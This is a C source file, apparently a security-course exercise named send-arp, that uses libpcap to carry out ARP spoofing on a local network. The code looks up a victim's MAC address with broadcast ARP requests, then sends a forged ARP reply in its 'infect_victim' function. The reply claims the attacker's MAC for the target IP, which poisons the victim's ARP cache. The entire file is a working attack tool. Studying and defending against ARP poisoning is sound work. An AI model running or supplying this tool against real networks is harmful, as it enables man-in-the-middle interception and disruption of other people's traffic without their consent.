#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define MAC_ALEN 6
#define ETH_P_ARP 0x0806
#define ARP_P_IP 0x0800
#define ARP_OP_REQUEST 1
#define ARP_OP_REPLY 2

#pragma pack(push, 1)
typedef struct {
    uint8_t dst_mac[MAC_ALEN];
    uint8_t src_mac[MAC_ALEN];
    uint16_t eth_type;
} EthHdr;

typedef struct {
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t hw_size;
    uint8_t proto_size;
    uint16_t op_code;
    uint8_t sender_mac[MAC_ALEN];
    uint32_t sender_ip;
    uint8_t target_mac[MAC_ALEN];
    uint32_t target_ip;
} ArpHdr;

typedef struct {
    EthHdr eth;
    ArpHdr arp;
} EthArpPacket;
#pragma pack(pop)

typedef struct {
    uint32_t sender_ip;
    uint32_t target_ip;
    uint8_t sender_mac[MAC_ALEN];
} Session;

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int get_my_info(const char* dev, uint8_t* mac, uint32_t* ip) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) { close(sock); return -1; }
    memcpy(mac, ifr.ifr_addr.sa_data, MAC_ALEN);
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) { close(sock); return -1; }
    *ip = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
    close(sock);
    return 0;
}

int get_victim_mac(pcap_t* handle, uint8_t* my_mac, uint32_t my_ip, uint32_t victim_ip, uint8_t* victim_mac) {
    EthArpPacket req_pkt;
    memset(&req_pkt, 0, sizeof(req_pkt));

    memset(req_pkt.eth.dst_mac, 0xFF, MAC_ALEN);
    memcpy(req_pkt.eth.src_mac, my_mac, MAC_ALEN);
    req_pkt.eth.eth_type = htons(ETH_P_ARP);
    req_pkt.arp.hw_type = htons(1);
    req_pkt.arp.proto_type = htons(ARP_P_IP);
    req_pkt.arp.hw_size = MAC_ALEN;
    req_pkt.arp.proto_size = 4;
    req_pkt.arp.op_code = htons(ARP_OP_REQUEST);
    memcpy(req_pkt.arp.sender_mac, my_mac, MAC_ALEN);
    req_pkt.arp.sender_ip = my_ip;
    req_pkt.arp.target_ip = victim_ip;

    //  패킷을 3번 연속으로 먼저 쏜다.
    for (int i = 0; i < 3; i++) {
        if (pcap_sendpacket(handle, (const u_char*)&req_pkt, sizeof(req_pkt)) != 0) return -1;
    }

    
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;
    
    alarm(1); // 1초 동안 응답 없으면 프로그램 종료(타임아웃)
    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
        if (res == 0) break; // pcap 내부 타임아웃 발생 시 루프 종료
        
        EthArpPacket* recv_pkt = (EthArpPacket*)packet;
        if (ntohs(recv_pkt->eth.eth_type) == ETH_P_ARP &&
            ntohs(recv_pkt->arp.op_code) == ARP_OP_REPLY &&
            recv_pkt->arp.sender_ip == victim_ip &&
            memcmp(recv_pkt->eth.dst_mac, my_mac, MAC_ALEN) == 0) {
            
            memcpy(victim_mac, recv_pkt->arp.sender_mac, MAC_ALEN);
            alarm(0); 
            return 0; 
        }
    }
    return -1;
} 

void infect_victim(pcap_t* handle, uint8_t* my_mac, Session* s) {
    EthArpPacket inf_pkt;
    memcpy(inf_pkt.eth.dst_mac, s->sender_mac, MAC_ALEN);
    memcpy(inf_pkt.eth.src_mac, my_mac, MAC_ALEN);
    inf_pkt.eth.eth_type = htons(ETH_P_ARP);

    inf_pkt.arp.hw_type = htons(1);
    inf_pkt.arp.proto_type = htons(ARP_P_IP);
    inf_pkt.arp.hw_size = MAC_ALEN;
    inf_pkt.arp.proto_size = 4;
    inf_pkt.arp.op_code = htons(ARP_OP_REPLY);

    memcpy(inf_pkt.arp.sender_mac, my_mac, MAC_ALEN);
    inf_pkt.arp.sender_ip = s->target_ip;
    memcpy(inf_pkt.arp.target_mac, s->sender_mac, MAC_ALEN);
    inf_pkt.arp.target_ip = s->sender_ip;

    pcap_sendpacket(handle, (const u_char*)&inf_pkt, sizeof(inf_pkt));
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) return -1;

    uint8_t my_mac[MAC_ALEN];
    uint32_t my_ip;
    get_my_info(dev, my_mac, &my_ip);

    int pair_count = (argc - 2) / 2;
    Session* sessions = malloc(sizeof(Session) * pair_count);

    for (int i = 0; i < pair_count; i++) {
        sessions[i].sender_ip = inet_addr(argv[2 + i * 2]);
        sessions[i].target_ip = inet_addr(argv[3 + i * 2]);
        
        if (get_victim_mac(handle, my_mac, my_ip, sessions[i].sender_ip, sessions[i].sender_mac) == 0) {
            infect_victim(handle, my_mac, &sessions[i]);
        }
    }

    free(sessions);
    pcap_close(handle);
    return 0;
}
